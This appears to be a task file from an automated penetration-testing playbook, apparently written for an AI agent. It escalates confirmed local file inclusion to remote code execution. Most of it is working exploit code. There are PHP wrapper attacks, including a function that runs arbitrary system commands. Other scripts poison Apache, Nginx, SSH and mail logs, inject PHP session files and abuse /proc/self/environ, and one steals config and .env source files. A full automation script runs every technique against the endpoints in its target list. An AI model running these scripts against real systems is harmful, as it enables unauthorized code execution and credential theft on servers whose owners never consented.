================================================================================
TASK 73 - LFI EXPLOITATION: FROM FILE READ TO REMOTE CODE EXECUTION
================================================================================
Covers testing_toolkit.txt Phase 9 Step 30 (Part 2)
Escalating confirmed LFI vulnerabilities to achieve RCE

PREREQUISITE: Task 72 must identify LFI-vulnerable endpoints first

================================================================================
INPUTS
================================================================================
outputs/lfi/lfi_confirmed.txt              <- Confirmed LFI from Task 72
outputs/lfi/traversal_confirmed.txt        <- Working traversal depths
outputs/nuclei/tech_stack.json             <- Technology detection
outputs/live_base_urls.txt                 <- Live hosts

================================================================================
OUTPUTS  
================================================================================
outputs/lfi/
    rce_confirmed.txt                      <- Endpoints where RCE achieved
    wrapper_results.txt                    <- PHP wrapper exploitation results
    log_poisoning_results.txt              <- Log poisoning attempts
    session_injection_results.txt          <- Session file injection results
    proc_environ_results.txt               <- /proc/self/environ results
    chain_documentation.txt                <- Full exploitation chains documented

================================================================================
[AGENT DECISION FRAMEWORK]
================================================================================

STOP AND THINK: You have confirmed LFI. Now choose exploitation path.

    What is the backend technology?
    |
    +-- PHP Application?
    |   |
    |   +-- Can include remote files? (allow_url_include=On)
    |   |   +-- Use php://input wrapper (direct code execution)
    |   |   +-- Use data:// wrapper (base64 encoded code)
    |   |
    |   +-- Cannot include remote? (allow_url_include=Off)
    |       +-- Try log poisoning (Apache/Nginx logs)
    |       +-- Try session file injection
    |       +-- Try /proc/self/environ (if Linux)
    |       +-- Try php://filter for source code disclosure
    |
    +-- Java Application?
    |   +-- Log poisoning less common
    |   +-- Focus on reading sensitive configs
    |   +-- Look for file upload + include chains
    |
    +-- Node.js Application?
    |   +-- Read package.json, .env files
    |   +-- Look for require() injection points
    |
    +-- Python Application?
        +-- Read config files, .env
        +-- Template injection via file include

================================================================================
PHASE 1: PHP WRAPPER EXPLOITATION
================================================================================

PHP wrappers allow code execution even when remote includes are disabled.

-----------------------------------------
1.1 Check php://input Wrapper
-----------------------------------------
The php://input wrapper reads raw POST data and can execute it as PHP.

DETECTION TEST:
Send POST request with PHP code in body to LFI parameter:
- Parameter: ?page=php://input
- POST body: <?php echo "LFI_TEST_SUCCESS"; ?>

If response contains "LFI_TEST_SUCCESS" = VULNERABLE TO RCE

EXPLOITATION SCRIPT:

#!/usr/bin/env python3
"""
php_input_exploit.py - Exploit LFI via php://input wrapper
"""

import requests
import sys

def test_php_input(url, param):
    """Test if php://input wrapper works"""
    
    # Build URL with php://input
    if '?' in url:
        test_url = f"{url}&{param}=php://input"
    else:
        test_url = f"{url}?{param}=php://input"
    
    # Marker to detect execution
    marker = "LFI_WRAPPER_TEST_12345"
    payload = f'<?php echo "{marker}"; ?>'
    
    try:
        resp = requests.post(
            test_url,
            data=payload,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=30,
            verify=False
        )
        
        if marker in resp.text:
            print(f"[CRITICAL] php://input RCE confirmed!")
            return True
    except Exception as e:
        print(f"Error: {e}")
    
    return False

def execute_command(url, param, command):
    """Execute system command via php://input"""
    
    if '?' in url:
        exploit_url = f"{url}&{param}=php://input"
    else:
        exploit_url = f"{url}?{param}=php://input"
    
    # PHP code to execute command
    php_code = f'<?php echo "CMD_START"; system("{command}"); echo "CMD_END"; ?>'
    
    try:
        resp = requests.post(
            exploit_url,
            data=php_code,
            timeout=30,
            verify=False
        )
        
        # Extract command output
        if "CMD_START" in resp.text and "CMD_END" in resp.text:
            start = resp.text.find("CMD_START") + 9
            end = resp.text.find("CMD_END")
            output = resp.text[start:end]
            return output.strip()
    except:
        pass
    
    return None

# Main
if __name__ == "__main__":
    # Read confirmed LFI endpoints
    with open('outputs/lfi/lfi_confirmed.txt') as f:
        for line in f:
            parts = line.strip().split('|')
            if len(parts) >= 2:
                url, param = parts[0], parts[1]
                
                if test_php_input(url, param):
                    # Test command execution
                    result = execute_command(url, param, "id")
                    if result:
                        print(f"[RCE] Command output: {result}")
                        
                        # Log success
                        with open('outputs/lfi/rce_confirmed.txt', 'a') as out:
                            out.write(f"{url}|{param}|php_input|{result[:50]}\n")

-----------------------------------------
1.2 data:// Wrapper Exploitation
-----------------------------------------
The data:// wrapper allows inline base64-encoded PHP code.

Payload format: data://text/plain;base64,BASE64_ENCODED_PHP

SCRIPT:

#!/usr/bin/env python3
"""
data_wrapper_exploit.py - Exploit LFI via data:// wrapper
"""

import requests
import base64

def test_data_wrapper(url, param):
    """Test data:// wrapper for code execution"""
    
    # PHP code to test
    marker = "DATA_WRAPPER_SUCCESS_67890"
    php_code = f'<?php echo "{marker}"; ?>'
    
    # Base64 encode
    encoded = base64.b64encode(php_code.encode()).decode()
    
    # Build payload
    payload = f"data://text/plain;base64,{encoded}"
    
    if '?' in url:
        test_url = f"{url}&{param}={payload}"
    else:
        test_url = f"{url}?{param}={payload}"
    
    try:
        resp = requests.get(test_url, timeout=30, verify=False)
        
        if marker in resp.text:
            print(f"[CRITICAL] data:// wrapper RCE confirmed!")
            return True
    except:
        pass
    
    return False

def execute_via_data(url, param, command):
    """Execute command via data:// wrapper"""
    
    php_code = f'<?php system("{command}"); ?>'
    encoded = base64.b64encode(php_code.encode()).decode()
    payload = f"data://text/plain;base64,{encoded}"
    
    if '?' in url:
        exploit_url = f"{url}&{param}={payload}"
    else:
        exploit_url = f"{url}?{param}={payload}"
    
    try:
        resp = requests.get(exploit_url, timeout=30, verify=False)
        return resp.text
    except:
        return None

-----------------------------------------
1.3 expect:// Wrapper (Less Common)
-----------------------------------------
The expect:// wrapper directly executes system commands.
Requires: expect extension installed (rare but powerful)

Payload: ?page=expect://id

SCRIPT:

#!/usr/bin/env python3
"""
expect_wrapper_test.py - Test expect:// wrapper
"""

import requests

def test_expect_wrapper(url, param):
    """Test if expect:// wrapper is available"""
    
    # expect:// directly executes commands
    payload = "expect://id"
    
    if '?' in url:
        test_url = f"{url}&{param}={payload}"
    else:
        test_url = f"{url}?{param}={payload}"
    
    try:
        resp = requests.get(test_url, timeout=30, verify=False)
        
        # Check for typical 'id' command output
        if "uid=" in resp.text and "gid=" in resp.text:
            print(f"[CRITICAL] expect:// wrapper available - Direct RCE!")
            return True
    except:
        pass
    
    return False

-----------------------------------------
1.4 php://filter for Source Code
-----------------------------------------
Even without RCE, php://filter reveals source code (sensitive info).

Payload: php://filter/convert.base64-encode/resource=index.php

This returns base64-encoded source code, bypassing PHP execution.

SCRIPT:

#!/usr/bin/env python3
"""
php_filter_source.py - Extract source code via php://filter
"""

import requests
import base64
import os

def extract_source(url, param, target_file):
    """Extract PHP source code via filter wrapper"""
    
    payload = f"php://filter/convert.base64-encode/resource={target_file}"
    
    if '?' in url:
        test_url = f"{url}&{param}={payload}"
    else:
        test_url = f"{url}?{param}={payload}"
    
    try:
        resp = requests.get(test_url, timeout=30, verify=False)
        
        # Try to find base64 content in response
        # Usually appears as a long base64 string
        import re
        b64_match = re.search(r'([A-Za-z0-9+/]{50,}={0,2})', resp.text)
        
        if b64_match:
            try:
                decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
                if '<?php' in decoded or '<?=' in decoded:
                    print(f"[+] Source code extracted: {target_file}")
                    return decoded
            except:
                pass
    except:
        pass
    
    return None

# Common files to extract
TARGET_FILES = [
    "index.php",
    "config.php",
    "database.php",
    "db.php",
    "settings.php",
    "config/database.php",
    "includes/config.php",
    "wp-config.php",
    ".env",
]

# Extract sources
os.makedirs('outputs/lfi/sources', exist_ok=True)

with open('outputs/lfi/lfi_confirmed.txt') as f:
    for line in f:
        parts = line.strip().split('|')
        if len(parts) >= 2:
            url, param = parts[0], parts[1]
            
            for target in TARGET_FILES:
                source = extract_source(url, param, target)
                if source:
                    safe_name = target.replace('/', '_').replace('.', '_')
                    with open(f'outputs/lfi/sources/{safe_name}.php', 'w') as out:
                        out.write(source)

================================================================================
PHASE 2: LOG POISONING ATTACKS
================================================================================

Log poisoning: Inject PHP code into log files, then include them via LFI.

-----------------------------------------
[DECISION POINT] Which Log to Target?
-----------------------------------------

Server Type -> Log Location -> Method

Apache:
  - /var/log/apache2/access.log
  - /var/log/apache2/error.log
  - /var/log/httpd/access_log
  Poison via: User-Agent header

Nginx:
  - /var/log/nginx/access.log
  - /var/log/nginx/error.log
  Poison via: User-Agent header

SSH:
  - /var/log/auth.log
  - /var/log/secure
  Poison via: SSH username

Mail:
  - /var/log/mail.log
  - /var/mail/www-data
  Poison via: SMTP RCPT TO

-----------------------------------------
2.1 Apache/Nginx Log Poisoning
-----------------------------------------
Inject PHP code via User-Agent header, then include log file.

EXPLOITATION SCRIPT:

#!/usr/bin/env python3
"""
log_poison_exploit.py - Log poisoning to RCE
"""

import requests
import time

# Log file locations to try
LOG_PATHS = [
    # Apache
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd-access.log",
    "/usr/local/apache/logs/access_log",
    "/usr/local/apache2/logs/access_log",
    # Nginx
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    # Generic
    "/var/log/access.log",
    "/var/log/error.log",
    # Windows (IIS)
    "C:/inetpub/logs/LogFiles/W3SVC1/u_ex*.log",
]

def poison_log(base_url, marker_id):
    """Inject PHP code into web server logs via User-Agent"""
    
    # Unique marker for this attempt
    marker = f"LOG_POISON_{marker_id}"
    
    # PHP payload in User-Agent (executed when log is included)
    # Using short tags and simple echo for reliability
    malicious_ua = f'<?php echo "{marker}"; ?>'
    
    headers = {
        'User-Agent': malicious_ua
    }
    
    try:
        # Make request to poison the log
        requests.get(base_url, headers=headers, timeout=10, verify=False)
        print(f"[*] Log poisoned with marker: {marker}")
        return marker
    except:
        return None

def check_log_inclusion(url, param, traversal, log_path, marker):
    """Check if we can include the poisoned log and execute code"""
    
    # Build LFI payload to include log
    payload = f"{traversal}{log_path}"
    
    if '?' in url:
        test_url = f"{url}&{param}={payload}"
    else:
        test_url = f"{url}?{param}={payload}"
    
    try:
        resp = requests.get(test_url, timeout=30, verify=False)
        
        if marker in resp.text:
            print(f"[CRITICAL] Log poisoning RCE confirmed!")
            print(f"[+] Log path: {log_path}")
            return True
    except:
        pass
    
    return False

def exploit_log_poisoning(url, param, traversal):
    """Full log poisoning exploitation"""
    
    # Extract base URL for poisoning
    from urllib.parse import urlparse
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}/"
    
    # Generate unique marker
    import random
    marker_id = random.randint(10000, 99999)
    
    # Poison the log
    marker = poison_log(base_url, marker_id)
    if not marker:
        return False
    
    # Wait for log to be written
    time.sleep(2)
    
    # Try each log path
    for log_path in LOG_PATHS:
        if check_log_inclusion(url, param, traversal, log_path, marker):
            return {
                'url': url,
                'param': param,
                'log_path': log_path,
                'traversal': traversal
            }
    
    return None

# Main execution
results = []

with open('outputs/lfi/lfi_confirmed.txt') as f:
    for line in f:
        parts = line.strip().split('|')
        if len(parts) >= 3:
            url, param, traversal = parts[0], parts[1], parts[2]
            
            result = exploit_log_poisoning(url, param, traversal)
            if result:
                results.append(result)
                
                # Save result
                with open('outputs/lfi/log_poisoning_results.txt', 'a') as out:
                    out.write(f"{url}|{param}|{result['log_path']}\n")

print(f"\n[*] Log poisoning successful on {len(results)} endpoints")

-----------------------------------------
2.2 SSH Log Poisoning
-----------------------------------------
If SSH is accessible, inject PHP via invalid username.

Steps:
1. Connect to SSH with PHP code as username
2. Include /var/log/auth.log via LFI

SCRIPT:

#!/bin/bash
# ssh_log_poison.sh

TARGET_IP="$1"
MARKER="SSH_POISON_$(date +%s)"

# Inject PHP code via SSH username (will fail auth but log the attempt)
# The "username" contains PHP code
ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    "<?php echo '$MARKER'; ?>"@${TARGET_IP} 2>/dev/null

echo "[*] SSH log poisoned with marker: $MARKER"
echo "[*] Now include /var/log/auth.log via LFI"

-----------------------------------------
2.3 Mail Log Poisoning
-----------------------------------------
Send email with PHP code to poison mail logs.

SCRIPT:

#!/usr/bin/env python3
"""
mail_log_poison.py - Poison mail logs for LFI RCE
"""

import smtplib
import socket

def poison_mail_log(target_host, marker):
    """Attempt to poison mail logs via SMTP"""
    
    # PHP payload
    php_code = f'<?php echo "{marker}"; ?>'
    
    try:
        # Connect to SMTP (port 25)
        smtp = smtplib.SMTP(target_host, 25, timeout=10)
        
        # The RCPT TO contains our payload
        # This gets logged even if delivery fails
        smtp.helo('attacker.com')
        smtp.mail('attacker@attacker.com')
        smtp.rcpt(php_code)
        smtp.quit()
        
        print(f"[*] Mail log poisoned via SMTP")
        return True
    except Exception as e:
        print(f"[-] SMTP not available: {e}")
        return False

# Mail log paths to try with LFI
MAIL_LOGS = [
    "/var/log/mail.log",
    "/var/log/maillog",
    "/var/spool/mail/www-data",
    "/var/mail/www-data",
]

================================================================================
PHASE 3: SESSION FILE INJECTION
================================================================================

PHP stores session data in files. If we control session content, we can
inject PHP code and include the session file.

-----------------------------------------
3.1 Session File Locations
-----------------------------------------
Default PHP session paths:
- /var/lib/php/sessions/sess_SESSIONID
- /var/lib/php5/sessions/sess_SESSIONID
- /tmp/sess_SESSIONID
- C:\Windows\Temp\sess_SESSIONID (Windows)

Session filename = "sess_" + PHPSESSID cookie value

-----------------------------------------
3.2 Session Injection Exploit
-----------------------------------------
SCRIPT:

#!/usr/bin/env python3
"""
session_inject_exploit.py - LFI via session file injection
"""

import requests

SESSION_PATHS = [
    "/var/lib/php/sessions/sess_",
    "/var/lib/php5/sessions/sess_",
    "/var/lib/php7/sessions/sess_",
    "/tmp/sess_",
    "/var/tmp/sess_",
    "C:/Windows/Temp/sess_",
]

def inject_session(target_url, session_id, payload):
    """Inject PHP code into session via a vulnerable parameter"""
    
    # Many apps store user input in session
    # Common injection points: username, preferences, search history
    
    injection_params = ['username', 'name', 'search', 'query', 'lang', 'theme']
    
    for param in injection_params:
        try:
            cookies = {'PHPSESSID': session_id}
            data = {param: payload}
            
            resp = requests.post(
                target_url,
                data=data,
                cookies=cookies,
                timeout=30,
                verify=False
            )
            
            # Session should now contain our payload
            print(f"[*] Injected into session via {param}")
            
        except:
            pass

def include_session(url, param, traversal, session_id, marker):
    """Try to include the session file via LFI"""
    
    for session_path in SESSION_PATHS:
        full_path = f"{session_path}{session_id}"
        payload = f"{traversal}{full_path}"
        
        if '?' in url:
            test_url = f"{url}&{param}={payload}"
        else:
            test_url = f"{url}?{param}={payload}"
        
        try:
            # Use the same session ID
            cookies = {'PHPSESSID': session_id}
            resp = requests.get(test_url, cookies=cookies, timeout=30, verify=False)
            
            if marker in resp.text:
                print(f"[CRITICAL] Session injection RCE confirmed!")
                print(f"[+] Session path: {full_path}")
                return True
        except:
            pass
    
    return False

def exploit_session_injection(url, param, traversal):
    """Full session injection exploit"""
    
    import random
    import string
    
    # Create unique session ID
    session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=26))
    marker = f"SESS_INJECT_{random.randint(10000, 99999)}"
    
    # PHP code to inject
    php_code = f'<?php echo "{marker}"; ?>'
    
    # Get base URL for session injection
    from urllib.parse import urlparse
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}/"
    
    # Inject payload into session
    inject_session(base_url, session_id, php_code)
    
    # Try to include session file
    return include_session(url, param, traversal, session_id, marker)

================================================================================
PHASE 4: /proc/self/environ EXPLOITATION
================================================================================

On Linux, /proc/self/environ contains environment variables including
HTTP headers. We can inject PHP via User-Agent.

-----------------------------------------
4.1 /proc/self/environ Attack
-----------------------------------------
SCRIPT:

#!/usr/bin/env python3
"""
proc_environ_exploit.py - LFI RCE via /proc/self/environ
"""

import requests

def exploit_proc_environ(url, param, traversal):
    """Exploit LFI via /proc/self/environ"""
    
    marker = "PROC_ENVIRON_RCE_SUCCESS"
    
    # PHP code in User-Agent header
    # When /proc/self/environ is included, this executes
    php_ua = f'<?php echo "{marker}"; ?>'
    
    # Build LFI payload
    proc_path = "/proc/self/environ"
    payload = f"{traversal}{proc_path}"
    
    if '?' in url:
        test_url = f"{url}&{param}={payload}"
    else:
        test_url = f"{url}?{param}={payload}"
    
    headers = {
        'User-Agent': php_ua
    }
    
    try:
        resp = requests.get(test_url, headers=headers, timeout=30, verify=False)
        
        if marker in resp.text:
            print(f"[CRITICAL] /proc/self/environ RCE confirmed!")
            return True
            
        # Check if we at least see environment variables (confirms read)
        if 'PATH=' in resp.text or 'HOME=' in resp.text:
            print(f"[+] Can read /proc/self/environ (might not execute PHP)")
            return 'readable'
            
    except:
        pass
    
    return False

================================================================================
PHASE 5: BYPASS TECHNIQUES
================================================================================

-----------------------------------------
5.1 Null Byte Bypass (PHP < 5.3.4)
-----------------------------------------
Older PHP versions: null byte terminates string, bypasses extension checks.

If code does: include($_GET['page'] . '.php')
Payload: ../../etc/passwd%00

The %00 (null byte) makes PHP ignore the '.php' suffix.

-----------------------------------------
5.2 Double Encoding
-----------------------------------------
If WAF or filter decodes once, double-encode:

../ -> %2e%2e%2f -> %252e%252e%252f

-----------------------------------------
5.3 Path Truncation
-----------------------------------------
On older systems, paths are truncated at certain lengths.
Pad with /. or ./ to exceed path limit and truncate extension.

Payload: ../../etc/passwd/./././.[repeated]./././

-----------------------------------------
5.4 Wrapper Encoding Variations
-----------------------------------------
Different encodings for php://filter:

php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php

================================================================================
PHASE 6: FULL AUTOMATION SCRIPT
================================================================================

#!/usr/bin/env python3
"""
lfi_to_rce_full.py - Complete LFI to RCE exploitation

Automatically tries all techniques:
1. PHP wrappers (php://input, data://, expect://)
2. Log poisoning (Apache, Nginx, SSH, Mail)
3. Session file injection
4. /proc/self/environ
5. Bypass techniques (null byte, encoding)
"""

import requests
import base64
import random
import time
import os
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

class LFIExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.results = []
    
    def test_php_input(self, url, param):
        """Test php://input wrapper"""
        marker = f"PHP_INPUT_{random.randint(10000,99999)}"
        php_code = f'<?php echo "{marker}"; ?>'
        
        test_url = f"{url}{'&' if '?' in url else '?'}{param}=php://input"
        
        try:
            resp = self.session.post(test_url, data=php_code, timeout=30)
            if marker in resp.text:
                return {'method': 'php_input', 'url': url, 'param': param}
        except:
            pass
        return None
    
    def test_data_wrapper(self, url, param):
        """Test data:// wrapper"""
        marker = f"DATA_WRAP_{random.randint(10000,99999)}"
        php_code = f'<?php echo "{marker}"; ?>'
        encoded = base64.b64encode(php_code.encode()).decode()
        payload = f"data://text/plain;base64,{encoded}"
        
        test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
        
        try:
            resp = self.session.get(test_url, timeout=30)
            if marker in resp.text:
                return {'method': 'data_wrapper', 'url': url, 'param': param}
        except:
            pass
        return None
    
    def test_expect_wrapper(self, url, param):
        """Test expect:// wrapper"""
        test_url = f"{url}{'&' if '?' in url else '?'}{param}=expect://id"
        
        try:
            resp = self.session.get(test_url, timeout=30)
            if "uid=" in resp.text:
                return {'method': 'expect_wrapper', 'url': url, 'param': param}
        except:
            pass
        return None
    
    def test_log_poisoning(self, url, param, traversal):
        """Test log poisoning"""
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}/"
        
        marker = f"LOG_POISON_{random.randint(10000,99999)}"
        php_ua = f'<?php echo "{marker}"; ?>'
        
        # Poison log
        try:
            self.session.get(base, headers={'User-Agent': php_ua}, timeout=10)
        except:
            pass
        
        time.sleep(1)
        
        # Try log paths
        log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access_log",
        ]
        
        for log_path in log_paths:
            payload = f"{traversal}{log_path}"
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
            
            try:
                resp = self.session.get(test_url, timeout=30)
                if marker in resp.text:
                    return {'method': 'log_poisoning', 'log': log_path, 'url': url}
            except:
                pass
        
        return None
    
    def test_proc_environ(self, url, param, traversal):
        """Test /proc/self/environ"""
        marker = f"PROC_ENV_{random.randint(10000,99999)}"
        php_ua = f'<?php echo "{marker}"; ?>'
        
        payload = f"{traversal}/proc/self/environ"
        test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
        
        try:
            resp = self.session.get(test_url, headers={'User-Agent': php_ua}, timeout=30)
            if marker in resp.text:
                return {'method': 'proc_environ', 'url': url, 'param': param}
        except:
            pass
        return None
    
    def exploit_all(self, url, param, traversal=''):
        """Try all exploitation techniques"""
        
        techniques = [
            ('php://input', lambda: self.test_php_input(url, param)),
            ('data://', lambda: self.test_data_wrapper(url, param)),
            ('expect://', lambda: self.test_expect_wrapper(url, param)),
            ('log_poisoning', lambda: self.test_log_poisoning(url, param, traversal)),
            ('/proc/self/environ', lambda: self.test_proc_environ(url, param, traversal)),
        ]
        
        for name, test_func in techniques:
            print(f"[*] Testing: {name}")
            result = test_func()
            
            if result:
                print(f"[CRITICAL] RCE via {name}!")
                self.results.append(result)
                return result
        
        return None
    
    def save_results(self, output_file):
        """Save successful exploits"""
        os.makedirs(os.path.dirname(output_file), exist_ok=True)
        
        with open(output_file, 'w') as f:
            for r in self.results:
                f.write(f"{r['method']}|{r['url']}|{r.get('param', '')}|{r.get('log', '')}\n")

# Main
if __name__ == "__main__":
    exploiter = LFIExploiter()
    
    with open('outputs/lfi/lfi_confirmed.txt') as f:
        for line in f:
            parts = line.strip().split('|')
            if len(parts) >= 2:
                url, param = parts[0], parts[1]
                traversal = parts[2] if len(parts) > 2 else '../../../..'
                
                print(f"\n[*] Exploiting: {url}")
                exploiter.exploit_all(url, param, traversal)
    
    exploiter.save_results('outputs/lfi/rce_confirmed.txt')
    print(f"\n[*] Total RCE achieved: {len(exploiter.results)}")

================================================================================
SUMMARY CHECKLIST
================================================================================

Before marking Task 73 complete, verify:

[ ] PHP wrappers tested (php://input, data://, expect://)
[ ] php://filter used for source code extraction
[ ] Log poisoning attempted (Apache, Nginx paths)
[ ] Session file injection tested
[ ] /proc/self/environ tested on Linux targets
[ ] Bypass techniques applied where needed
[ ] All successful RCE documented in outputs/lfi/rce_confirmed.txt
[ ] Exploitation chains documented in outputs/lfi/chain_documentation.txt

================================================================================
CRITICAL NOTES
================================================================================

1. PHP WRAPPERS require allow_url_include=On for input/data (but filter works without)
2. LOG POISONING requires knowing the correct log path
3. SESSION INJECTION requires a way to control session data
4. /proc/self/environ is Linux-only
5. NULL BYTE only works on PHP < 5.3.4

Priority order for exploitation attempts:
1. php://input (easiest if available)
2. data:// wrapper (similar ease)
3. expect:// (rare but direct)
4. Log poisoning (requires correct path)
5. Session injection (requires session control)
6. /proc/self/environ (Linux only)
